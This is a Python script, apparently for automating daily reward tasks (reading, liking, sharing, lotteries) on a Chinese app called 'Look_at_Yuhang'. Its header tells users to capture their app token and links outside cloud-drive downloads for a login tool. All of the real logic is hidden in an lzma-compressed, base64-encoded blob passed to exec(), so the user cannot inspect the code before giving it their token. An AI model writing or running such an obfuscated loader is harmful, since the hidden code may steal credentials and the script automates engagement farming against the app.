"""
每日低保
先注册好APP和绑定
变量名：Look_at_Yuhang
Cron:自己定,一天一次或两次,看任务量
自行抓包app的token,或使用接码登录获取工具：哪个能下就用那个
https://www.123pan.com/s/wmSqVv-Zvfxh.html
https://pan.xunlei.com/s/VNpOQ2c7pPpvoFw80LP9p4EXA1?pwd=vn4v
多账号换行或&
阅读点赞分享抽奖
自行决定做不做评论任务, 通过设置comment的值
设置comment = 0 , 则不做评论
------------------------------------------
"""
import lzma, base64
comment = 0  #等于1，即做评论任务
exec(lzma.decompress(base64.b64decode('/Td6WFoAAATm1rRGAgAhARYAAAB0L+Wj4EEvFsldADSbSme4Ujxz4BYljVY8LZ28V/I82cOanq/4f3q6mlS0fJAq9jVgZdiEOGtBU4x…S25tDQy9f0BtJIalYY1vSpLuaHRA6B7EVfAehrxAo/Ho0YYfzw9qLLDvtlVQ1yyUKL344wW9dT6wh/SNstmAfBMeFNi7mpZ7A6fgn+nEub7NwlhTS8msI5oxNom1sG54moUNslLfe4hMukKlJc/rvO7zd2Niu2aXSzI7q00xeRqQ7ZmqeXNF+jWRdKcnZUfdNt9eXegZoFP/FQgEDlyxEbXUq2gK/RSPvFjDZnxU1dexjrRChhe14oK1cv1EY6F/kwy7cirHeyfiF6snC+SwYZ62WFT88hbX/XYj8aRLKRV8fm7XjRmGo5YrDNrUEGmTw/Sci9l2RDAVuiPfvbf9tSxBf9upsBu2xNKCdBBq32XBuOl/iueaNOnUL0qTZnzcCrzYHRNk9yzSw9flGHQSZFLUPrAHdopU/GM/kPIR7KUExXlU5vw5kPlTrkR/rGEAAAAA1hqRDLGmfdUAAeUtsIIBAGwFVVqxxGf7AgAAAAAEWVo=')))